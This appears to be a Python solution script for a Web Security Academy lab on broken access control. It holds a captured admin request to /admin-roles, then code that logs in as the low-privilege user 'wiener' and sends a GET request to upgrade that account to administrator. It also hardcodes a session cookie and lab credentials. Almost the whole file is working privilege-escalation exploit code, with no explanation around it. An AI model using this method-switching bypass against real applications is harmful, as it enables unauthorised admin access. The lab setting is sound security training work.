'''
POST /admin-roles HTTP/2
Host: 0a39000d03cbe65c802e8580005a008b.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: https://0a39000d03cbe65c802e8580005a008b.web-security-academy.net
Connection: keep-alive
Referer: https://0a39000d03cbe65c802e8580005a008b.web-security-academy.net/admin
Cookie: session=fDhnxusBoG1AHGbO3EtY6vf9JKGhN3P1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
TE: trailers

username=carlos&action=upgrade
'''

import requests

DOMAIN = "0a39000d03cbe65c802e8580005a008b.web-security-academy.net"

HEADERS = {
    "Host": DOMAIN,
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": f"https://{DOMAIN}",
    "Connection": "keep-alive",
    "Referer": f"https://{DOMAIN}/admin",
    "Cookie": "session=fDhnxusBoG1AHGbO3EtY6vf9JKGhN3P1",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "TE": "trailers"
}

def login():
    url = f"https://{DOMAIN}/login"
    data = {
        "username": "wiener",
        "password": "peter"
    }
    response = requests.post(url, data=data, headers=HEADERS)

    HEADERS["Cookie"] = response.request.headers["Cookie"]
    print(response.request.headers["Cookie"])

def upgrade():
    url = f"https://{DOMAIN}/admin-roles?username=wiener&action=upgrade"
    data = {
        "username": "wiener",
        "action": "upgrade"
    }

    response = requests.get(url, headers=HEADERS)

    print(response.text)


login()
upgrade()